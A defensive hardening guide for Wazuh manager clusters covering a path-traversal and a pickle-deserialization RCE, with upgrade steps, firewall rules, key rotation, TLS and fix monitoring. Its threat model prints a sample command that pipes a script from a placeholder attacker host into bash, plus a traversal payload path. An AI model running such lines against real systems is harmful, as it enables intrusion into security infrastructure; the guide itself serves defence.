---
title: "Wazuh Cluster Security Hardening"
description: "Harden Wazuh against CVE-2026-30893 cluster path traversal RCE (CVSS 9.0) and CVE-2026-25769 deserialization RCE, with monitoring for Wazuh's coordinated disclosure patterns."
slug: wazuh-cluster-security
date: 2026-05-03
lastmod: 2026-05-03
category: observability
tags: ["wazuh", "cve-2026-30893", "cve-2026-25769", "cluster-security", "path-traversal", "rce", "siem"]
personas: ["sre", "security-engineer", "platform-engineer"]
article_number: 379
difficulty: advanced
estimated_reading_time: 16
published: true
layout: article.njk
permalink: "/articles/observability/wazuh-cluster-security/index.html"
---

# Wazuh Cluster Security Hardening

## Problem

Wazuh is an open source security platform that combines SIEM, XDR (Extended Detection and Response), and compliance capabilities into a unified, self-hosted solution. It runs as a multi-component system: the Wazuh Manager is the central server responsible for receiving events, running analysis, and generating alerts; Wazuh Agents run on endpoints and forward telemetry back to the Manager; and for high-availability deployments, multiple Manager nodes can be arranged into a cluster that synchronises rules, decoders, configuration, and state across nodes. Wazuh is widely deployed as a self-hosted security platform for endpoint monitoring, file integrity monitoring, log analysis, vulnerability detection, and incident response. Its position as the security nerve centre of an environment — receiving telemetry from every monitored host, storing investigation data, and generating alerts — makes it an exceptionally high-value target. Compromising the Wazuh Manager is equivalent to compromising the organisation's ability to detect and respond to threats.

**CVE-2026-30893 (CVSS 9.0, Critical, disclosed April 29, 2026)** is a path traversal vulnerability in Wazuh's cluster synchronisation mechanism (`wazuh-cluster`). When Wazuh Manager nodes synchronise files between cluster members — rules, decoders, CDB lists, custom Python framework modules — the receiving node processes a synchronisation payload that includes destination file paths. Before the fix, the receiving node did not validate those paths for directory traversal sequences. An authenticated cluster peer could send a synchronisation payload specifying a destination path such as `../../wazuh/framework/wazuh/malicious.py`, causing the receiving Manager to write attacker-controlled content outside the intended sync directory and into the Wazuh Python framework path. Because Wazuh Manager's analysis and cluster daemons import Python modules from the framework at runtime, a malicious `.py` file planted on the Python path results in arbitrary code execution with Manager-level privileges the next time the framework imports from that path. The vulnerability affects Wazuh 4.4.0 through 4.14.3. The fix shipped in 4.14.4, where the cluster file sync handler was updated to canonicalise and validate all destination paths before writing.

**CVE-2026-25769 (disclosed April–May 2026)** is an unsafe deserialization vulnerability in Wazuh's cluster communication protocol. The cluster protocol used Python's `pickle` module (or a pickle-equivalent serializer) for certain cluster management messages — health checks, node state broadcasts, and configuration synchronisation. Python's `pickle` is inherently unsafe when deserializing data from untrusted sources: the `__reduce__` method in a crafted pickle payload allows arbitrary code execution during the deserialization step itself, before any application-level validation can occur. An authenticated cluster peer could craft a malicious pickled message and send it to any Manager node listening on the cluster port. When the receiving Manager called `pickle.loads()` on the payload, the attacker's code ran immediately with Manager privileges. This vulnerability affects Wazuh 4.0.0 through 4.14.2 and was fixed in 4.14.3, where the cluster protocol migrated to a safe serialization format for affected message types.

Both CVEs share a cascading risk rooted in how Wazuh cluster peers authenticate. Wazuh cluster authentication uses a pre-shared key — a single symmetric secret that all cluster nodes share, configured in the `<cluster>` section of `ossec.conf`. Any party who knows this key can authenticate to the cluster port (TCP 1516) as a valid peer and send cluster protocol messages, including the malicious sync payloads or deserialized RCE payloads described above. The pre-shared key is stored in plaintext in `/var/ossec/etc/ossec.conf` on every Manager node. Attackers can obtain this key through several realistic paths: a compromised endpoint whose Wazuh Agent has broad filesystem access to the Manager node, network traffic capture if cluster communication is not TLS-encrypted, inadvertent inclusion of `ossec.conf` in a version-controlled configuration repository, or exfiltration of backup archives. Once the key is known, both CVEs are reachable from anywhere on the network that has access to TCP 1516 — a port that is frequently not firewalled from the general internal network because administrators assume that cluster traffic is an internal-only concern.

The open source nature of Wazuh creates a specific operational risk around disclosure timing. The Wazuh GitHub repository at `github.com/wazuh/wazuh` is public. The fix for CVE-2026-30893 was committed to `framework/wazuh/core/cluster/` — specifically, path validation logic was added to the cluster file synchronisation handler — and this commit was publicly visible in the repository before the CVE was formally published on April 29, 2026 via NVD. An attacker who monitors the Wazuh repository for commits touching cluster code has a window to understand and weaponise the vulnerability before operators who rely solely on CVE notifications have been alerted. The Wazuh project publishes security advisories through GitHub releases and through their documentation site, but not consistently through GitHub Security Advisories (GHSA) or a CVE-first disclosure process. This pattern is not new to Wazuh: CVE-2021-26813, a prior cluster deserialization issue, followed the same trajectory of commit-before-advisory. Monitoring the correct upstream signals is therefore part of the defence.

To track Wazuh security fixes proactively, combine the following monitoring approaches. Watch the GitHub Security Advisories tab at `https://github.com/wazuh/wazuh/security/advisories`. Subscribe to Wazuh release notifications via GitHub's watch function, and monitor the documentation changelog at `https://documentation.wazuh.com/current/release-notes/`. Run periodic commit searches against the cluster code path:

```bash
gh api repos/wazuh/wazuh/commits \
  --jq '.[] | select(.commit.message | test("cluster|sync|path|traversal|deserializ|pickle|CVE|security"; "i")) | {sha: .sha[0:8], msg: .commit.message}'
```

Also search for commits touching the cluster framework directory specifically:

```bash
gh api "repos/wazuh/wazuh/commits?path=framework/wazuh/core/cluster/&per_page=10" \
  --jq '.[] | {sha: .sha[0:8], date: .commit.author.date, msg: .commit.message[:120]}'
```

Target systems: Wazuh 4.4.0–4.14.3 (CVE-2026-30893 path traversal RCE), 4.0.0–4.14.2 (CVE-2026-25769 deserialization RCE). Both vulnerabilities are fixed in Wazuh 4.14.4.

## Threat Model

1. **CVE-2026-30893 path traversal → RCE via Python module injection**: An attacker who has obtained the Wazuh cluster pre-shared key connects to the cluster port (TCP 1516) on a target Manager node, authenticates as a legitimate cluster peer, and sends a crafted file synchronisation payload. The payload specifies a destination path containing traversal sequences — for example, `../../wazuh/framework/wazuh/malicious.py` — and delivers attacker-controlled Python source as the file content. The receiving Manager writes the file without path validation, placing `malicious.py` into the Wazuh Python framework directory. On the next event analysis cycle, the Wazuh Manager process imports from the framework and executes the attacker's code with the privileges of the `wazuh` user (which has read access to all agent event data, rule configurations, and the ossec.conf containing other credentials).

2. **CVE-2026-25769 deserialization → RCE via crafted pickle payload**: An attacker authenticates to the cluster port and sends a cluster management message whose body is a maliciously crafted pickle payload. The payload's `__reduce__` method instructs Python's `pickle.loads()` to call `os.system()` with an attacker-specified command — for example, `os.system("curl https://evil.example.com/shell.sh | bash")`. Code execution occurs at the moment the receiving Manager deserializes the message, before any application logic inspects its contents. The reverse shell runs as the Wazuh process user with access to all Wazuh data including the ossec.conf, agent keys, and the full event database.

3. **Compromised Wazuh Agent exfiltrating the cluster pre-shared key**: The cluster pre-shared key resides in plaintext in `/var/ossec/etc/ossec.conf` on every Wazuh Manager. A malicious process on an endpoint that runs a Wazuh Agent can attempt to read the Manager's configuration if the agent process has been elevated to run with broad filesystem permissions, if the attacker has pivoted to the Manager node itself, or if the `ossec.conf` was backed up to a location readable by agents. In containerised deployments, the `ossec.conf` is sometimes mounted as a ConfigMap or Secret that is accessible to other pods in the same namespace. Once the key is retrieved, the attacker can exploit either CVE from any host with network access to TCP 1516.

4. **Patch-gap attacker exploiting visible commit history**: An attacker monitoring `github.com/wazuh/wazuh` for commits to `framework/wazuh/core/cluster/` observes a commit titled "Fix path validation in cluster file sync handler" several days before CVE-2026-30893 is formally published. The commit diff reveals the exact code path that was vulnerable and the nature of the fix. The attacker cross-references the Wazuh release timeline to determine which versions remain unpatched, uses Shodan or masscan to identify Wazuh Manager nodes with port 1516 open, and begins attempting the path traversal attack against unpatched clusters — operating with a fully understood exploit during the window when most operators have not yet received a CVE alert.

The blast radius of a compromised Wazuh Manager is extreme. The Manager receives telemetry from every monitored endpoint in the environment, maintains a database of file integrity baselines, stores vulnerability scan results, and holds agent authentication keys. An attacker with Manager-level access can suppress or forge alerts, remove agents from monitoring to blind the security team, access credentials and secrets that appear in monitored logs, and read the full registry of monitored hosts and their network addresses. The SIEM is also the tool used to investigate incidents — a compromised Wazuh instance means the attacker can observe and interfere with the incident response process in real time.

## Configuration / Implementation

### Upgrading Wazuh to 4.14.4

Upgrade to 4.14.4 first. Both CVEs are fixed in this release. On Debian/Ubuntu:

```bash
apt-get update
apt-get install --only-upgrade wazuh-manager=4.14.4
systemctl restart wazuh-manager
```

On RHEL/CentOS:

```bash
yum update wazuh-manager-4.14.4
systemctl restart wazuh-manager
```

For Docker deployments:

```bash
docker pull wazuh/wazuh-manager:4.14.4
# Update your compose file or Kubernetes manifest to reference the new tag, then redeploy
docker-compose up -d
```

For Kubernetes deployments using the Wazuh Helm chart:

```bash
helm upgrade wazuh wazuh/wazuh \
  --set manager.image.tag=4.14.4 \
  --namespace wazuh \
  --reuse-values
```

Verify the running version after upgrade:

```bash
/var/ossec/bin/wazuh-control info
# Expected output includes: Wazuh v4.14.4
```

On multi-node clusters, upgrade all Manager nodes to 4.14.4 and restart them before re-enabling cluster synchronisation. Running a mixed-version cluster with one node on 4.14.3 or earlier and another on 4.14.4 leaves the unpatched node exploitable.

### Cluster Port Network Isolation

Network isolation is the single most impactful mitigation available before patching is complete and should be applied immediately regardless of Wazuh version. The cluster communication port (TCP 1516) must accept connections only from the IP addresses of known Wazuh Manager nodes. No other host on the internal network should be able to reach this port.

On each Wazuh Manager node, add iptables rules that allowlist the other cluster members and drop all other inbound connections to port 1516:

```bash
# Allow cluster traffic from Manager node 2 only
iptables -A INPUT -p tcp --dport 1516 -s <manager-2-ip> -j ACCEPT

# Allow cluster traffic from Manager node 3 (if present)
iptables -A INPUT -p tcp --dport 1516 -s <manager-3-ip> -j ACCEPT

# Drop all other inbound connections to the cluster port
iptables -A INPUT -p tcp --dport 1516 -j DROP
```

Also restrict the Wazuh agent communication port to known agent IP ranges to limit lateral movement paths:

```bash
# Allow agent traffic only from designated agent network segments
iptables -A INPUT -p tcp --dport 1514 -s <agent-network-cidr> -j ACCEPT
iptables -A INPUT -p tcp --dport 1514 -j DROP
```

Persist these rules across reboots using `iptables-save` and your distribution's mechanism for restoring them at boot (`/etc/iptables/rules.v4` on Debian, `iptables-restore` service on RHEL).

Verify the isolation is effective from a host outside the allowlist:

```bash
# Run from a non-Manager host — should time out, not return a banner
nmap -p 1516 -Pn --open <manager-ip>
# Expected: Host is up, but 1516/tcp is filtered or closed
```

For Kubernetes deployments, apply a NetworkPolicy that restricts ingress to the cluster port:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: wazuh-manager-cluster-ingress
  namespace: wazuh
spec:
  podSelector:
    matchLabels:
      app: wazuh-manager
  policyTypes:
    - Ingress
  ingress:
    # Cluster sync port — allow only from other Manager pods
    - from:
        - podSelector:
            matchLabels:
              app: wazuh-manager
      ports:
        - protocol: TCP
          port: 1516
    # Agent registration and event port — allow from agent namespaces only
    - from:
        - namespaceSelector:
            matchLabels:
              wazuh-agents: "true"
      ports:
        - protocol: TCP
          port: 1514
        - protocol: UDP
          port: 1514
    # Wazuh API port — allow from API consumers (dashboards, scripts)
    - from:
        - namespaceSelector:
            matchLabels:
              wazuh-api-consumer: "true"
      ports:
        - protocol: TCP
          port: 55000
```

### Cluster Key Rotation

The cluster pre-shared key should be rotated on a regular schedule and immediately if there is any reason to believe it has been exposed. The key is defined in the `<cluster>` section of `/var/ossec/etc/ossec.conf` on every Manager node.

Generate a new strong key:

```bash
openssl rand -hex 32
# Example output: a3f8c2d1e4b5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1
```

Update the key in `ossec.conf` on every cluster node. The `<cluster>` section looks like this — replace `<key>` with the newly generated value:

```xml
<ossec_config>
  <cluster>
    <name>wazuh-cluster</name>
    <node_name>manager-1</node_name>
    <node_type>master</node_type>
    <key>a3f8c2d1e4b5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1</key>
    <port>1516</port>
    <bind_addr>0.0.0.0</bind_addr>
    <nodes>
      <node>manager-1.internal.example.com</node>
      <node>manager-2.internal.example.com</node>
    </nodes>
    <hidden>no</hidden>
    <disabled>no</disabled>
  </cluster>
</ossec_config>
```

Update all nodes simultaneously and restart the cluster:

```bash
# On each Manager node — update the key, then restart
systemctl restart wazuh-manager
```

Never store the cluster key in plaintext in a version control repository. Use Ansible Vault, HashiCorp Vault, or AWS Secrets Manager to distribute the key to Manager nodes at deployment time. An example Ansible task that reads the key from Vault and writes it to `ossec.conf`:

```yaml
- name: Set Wazuh cluster key from Vault
  ansible.builtin.replace:
    path: /var/ossec/etc/ossec.conf
    regexp: '<key>.*</key>'
    replace: '<key>{{ wazuh_cluster_key }}</key>'
  vars:
    wazuh_cluster_key: "{{ lookup('community.hashi_vault.hashi_vault', 'secret=wazuh/cluster key=cluster_key') }}"
  notify: restart wazuh-manager
```

Verify the config does not appear in any Git history or configuration management system in plaintext:

```bash
git -C /path/to/config-repo log --all -p -- ossec.conf \
  | grep -E '<key>[a-f0-9]{32,}</key>'
# Expected: no output — the key should not be in version control history
```

### TLS for Cluster Communication

Wazuh 4.x supports SSL/TLS for cluster connections. Enabling TLS means that even if the pre-shared key is compromised, an attacker must also present a valid cluster peer certificate to authenticate — providing a second factor of trust.

Generate cluster certificates using the Wazuh certificate tool:

```bash
/var/ossec/bin/wazuh-certs-tool -A
# Generates CA, Manager, and Worker certificates under /var/ossec/etc/certs/
```

Enable TLS in the `<cluster>` configuration block in `ossec.conf`:

```xml
<cluster>
  <name>wazuh-cluster</name>
  <node_name>manager-1</node_name>
  <node_type>master</node_type>
  <key>a3f8c2d1e4b5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1</key>
  <port>1516</port>
  <bind_addr>0.0.0.0</bind_addr>
  <nodes>
    <node>manager-1.internal.example.com</node>
    <node>manager-2.internal.example.com</node>
  </nodes>
  <hidden>no</hidden>
  <disabled>no</disabled>
  <transport>SSL</transport>
  <ca>
    /var/ossec/etc/certs/root-ca.pem
  </ca>
  <cert>
    /var/ossec/etc/certs/manager-1.pem
  </cert>
  <private_key>
    /var/ossec/etc/certs/manager-1-key.pem
  </private_key>
</cluster>
```

Pin peer certificates: only the certificates issued by your cluster CA should be accepted as valid cluster peers. Restrict the CA to issuing certificates only for known Manager node hostnames, and rotate the cluster CA annually or whenever a Manager node is decommissioned.

### Disabling Cluster if Not Required

If you are running a single Wazuh Manager node without a high-availability requirement, disable clustering entirely. A disabled cluster means the cluster port (1516) is never opened, eliminating the entire attack surface for both CVEs.

In `/var/ossec/etc/ossec.conf`, set `<disabled>yes</disabled>` in the cluster block:

```xml
<cluster>
  <name>wazuh-cluster</name>
  <node_name>manager-1</node_name>
  <node_type>master</node_type>
  <key>placeholder-not-used-when-disabled</key>
  <port>1516</port>
  <bind_addr>0.0.0.0</bind_addr>
  <nodes>
    <node>manager-1.internal.example.com</node>
  </nodes>
  <hidden>no</hidden>
  <disabled>yes</disabled>
</cluster>
```

Verify that clustering is disabled and the port is not listening after restart:

```bash
grep -A3 "<cluster>" /var/ossec/etc/ossec.conf
# Confirm <disabled>yes</disabled> is present

ss -tlnp | grep 1516
# Expected: no output — the cluster port should not be open
```

### Monitoring Wazuh for Security Fixes

Because Wazuh sometimes commits fixes to the public repository before publishing a formal CVE advisory, monitoring the repository directly provides earlier warning than waiting for NVD or GHSA entries.

Watch for commits touching the cluster framework directory — this is the code path affected by both CVEs:

```bash
gh api "repos/wazuh/wazuh/commits?path=framework/wazuh/core/cluster/&per_page=10" \
  --jq '.[] | {sha: .sha[0:8], date: .commit.author.date, msg: .commit.message[:120]}'
```

Search recent commits across the repository for security-relevant keywords:

```bash
gh api repos/wazuh/wazuh/commits \
  --jq '.[] | select(.commit.message | test("cluster|sync|path|CVE|security|traversal|deserializ|pickle"; "i")) | {sha: .sha[0:8], msg: .commit.message}'
```

Monitor the GitHub Security Advisories tab directly:

```
https://github.com/wazuh/wazuh/security/advisories
```

Subscribe to Wazuh release notifications on GitHub and check the release changelog at:

```
https://documentation.wazuh.com/current/release-notes/
```

Use Renovate to track the Wazuh Manager Docker image and automatically open a PR when a new version is published. Add to `renovate.json`:

```json
{
  "packageRules": [
    {
      "matchPackageNames": ["wazuh/wazuh-manager"],
      "matchDatasources": ["docker"],
      "automerge": false,
      "reviewers": ["security-team"],
      "labels": ["security", "wazuh", "siem"]
    }
  ]
}
```

For Helm-based deployments, Renovate also tracks the `wazuh/wazuh` Helm chart version:

```json
{
  "packageRules": [
    {
      "matchPackageNames": ["wazuh"],
      "matchDatasources": ["helm"],
      "automerge": false,
      "reviewers": ["security-team"],
      "labels": ["security", "wazuh"]
    }
  ]
}
```

## Expected Behaviour

| Signal | Unpatched Wazuh, cluster exposed | Patched + network isolated + TLS |
|---|---|---|
| Path traversal sync payload sent to cluster port | Receiving Manager writes the attacker-specified file to the traversed path; malicious `.py` module appears in the framework directory; code executes on next framework import | Path validation in 4.14.4 rejects the traversal sequence; write is refused; error logged to `ossec.log`; sync payload discarded |
| Deserialization exploit sent over cluster port | Receiving Manager calls `pickle.loads()` on the payload; arbitrary attacker code executes with Manager privileges before any validation | 4.14.3+ uses safe serialization; cluster port unreachable from non-Manager hosts due to firewall rules; TLS certificate mismatch blocks unauthenticated peers |
| Cluster port 1516 probed from non-Manager host | Connection accepted; cluster protocol negotiation proceeds using the pre-shared key as the only authentication gate | iptables rule drops the connection; nmap reports port as filtered; no cluster protocol handshake occurs |
| Pre-shared key in plaintext ossec.conf | Key readable from `ossec.conf` on any Manager; key also visible in backups, version control, or configuration management system exports | Key distributed via secrets manager (Vault/SSM); never committed to version control; rotation procedure documented and exercised quarterly |
| Patch-gap window after CVE-2026-30893 published April 29 | Operator relying on CVE notification email from NVD delays patching; cluster port accessible; unpatched for days to weeks after public disclosure | Renovate PR opened when 4.14.4 image tag appears in registry; gh commit watcher alerts on cluster-path security commit before CVE is published; network isolation limits exposure during patch window |

## Trade-offs

| Aspect | Benefit | Cost | Mitigation |
|---|---|---|---|
| Firewall restricting port 1516 to known Manager IPs | Eliminates the network attack surface for both CVEs; blocks patch-gap exploitation from any host outside the allowlist | Adding a new Manager node to the cluster requires updating the firewall allowlist on all existing nodes before the new node can sync | Manage iptables rules with Ansible or Terraform; make cluster node IP allowlisting part of the standard node provisioning playbook so new nodes are never added without the corresponding firewall update |
| Cluster TLS with certificate pinning | Adds a second authentication factor; a compromised pre-shared key alone is no longer sufficient to authenticate as a cluster peer | Requires generating and distributing cluster certificates; certificate expiry causes cluster sync failures; overhead of certificate renewal lifecycle | Automate certificate renewal with `wazuh-certs-tool` and a cron job; monitor certificate expiry with Prometheus `x509_cert_expiry` metric or equivalent; set calendar reminders for manual renewal if automation is not in place |
| Cluster key rotation procedure | Limits exposure window if the key is compromised; reduces risk from long-lived static secrets | All cluster nodes must receive the new key and restart simultaneously; a brief period of cluster sync downtime occurs during rotation; nodes with mismatched keys fail to communicate | Schedule rotation during a low-activity maintenance window; use Ansible to distribute the key and trigger restarts in a controlled order (workers before master, then master); confirm cluster health after each restart before proceeding |
| Disabling cluster (single-Manager mode) | Eliminates the entire CVE-2026-30893 and CVE-2026-25769 attack surface; no cluster port opened; no pre-shared key required | Loses high-availability capability; Manager becomes a single point of failure for the entire security monitoring stack | For environments that need HA, use cluster with full network isolation and TLS rather than disabling; for environments where downtime is acceptable, single-Manager with regular snapshots or backup-based recovery is appropriate |

## Failure Modes

| Failure | Symptom | Detection | Recovery |
|---|---|---|---|
| Firewall rule blocks legitimate new cluster node being added | New Manager node cannot join the cluster; sync attempts from the new node are dropped at the existing nodes' iptables; `wazuh-manager` logs show timeout errors connecting to the master | `ossec.log` on the new node contains `[Cluster] Connection refused` or timeout errors; master node shows no record of the new worker node joining | Add the new node's IP to the iptables allowlist on all existing nodes before attempting cluster join: `iptables -I INPUT -p tcp --dport 1516 -s <new-node-ip> -j ACCEPT`; verify with `nmap -p 1516 <master-ip>` from the new node before re-attempting join |
| Cluster TLS certificate mismatch after rotation | Manager nodes fail to re-join the cluster after certificate update; cluster sync stops; the Wazuh dashboard shows stale data for one or more nodes | `ossec.log` shows `[Cluster] SSL handshake error: certificate verify failed`; `wazuh-clusterd` process exits or logs repeated connection errors; cluster status via API returns degraded worker nodes | Verify that the new certificates on all nodes were signed by the same cluster CA: `openssl verify -CAfile /var/ossec/etc/certs/root-ca.pem /var/ossec/etc/certs/manager-N.pem`; check certificate expiry: `openssl x509 -enddate -noout -in /var/ossec/etc/certs/manager-1.pem`; if the CA was replaced (not just the leaf certs), redeploy all node certificates from the new CA simultaneously |
| Key rotation desync — nodes hold different pre-shared keys | Worker nodes with the old key cannot authenticate to the master node running the new key; cluster sync halts; worker nodes enter a disconnected state and stop forwarding their agent event data to the master | `ossec.log` on the worker contains `[Cluster] Authentication error: invalid key`; master node shows the worker as disconnected; agent events from endpoints on the desynchronised worker stop appearing in the Wazuh dashboard | Re-apply the correct key to the out-of-sync node's `ossec.conf`, confirm it matches the master, and restart `wazuh-manager` on that node; use `diff <(ssh manager-1 grep '<key>' /var/ossec/etc/ossec.conf) <(ssh manager-2 grep '<key>' /var/ossec/etc/ossec.conf)` to verify key parity before restart |
| Wazuh upgrade to 4.14.4 breaks custom rules or framework integrations | Custom Python scripts in `/var/ossec/integrations/` or custom decoders fail after upgrade; alerts that previously triggered stop appearing; Wazuh API returns unexpected errors | `ossec.log` shows Python tracebacks from integration scripts; custom alert rules show syntax errors in the Wazuh ruleset validator; Wazuh API error responses reference changed endpoint paths | Before upgrading production, test on a non-production Manager with the same custom rules and integrations; check the Wazuh 4.14.4 release notes for breaking changes to the framework API and decoder syntax; for failed integrations, update the script to the new API calling conventions and redeploy |

## Related Articles

- [Graylog Security Hardening](/articles/observability/graylog-security-hardening/)
- [Centralized Logging](/articles/observability/centralized-logging/)
- [Log Integrity](/articles/observability/log-integrity/)
- [Production Access Management](/articles/cross-cutting/production-access-management/)
- [Vulnerability Management Program](/articles/cross-cutting/vulnerability-management-program/)
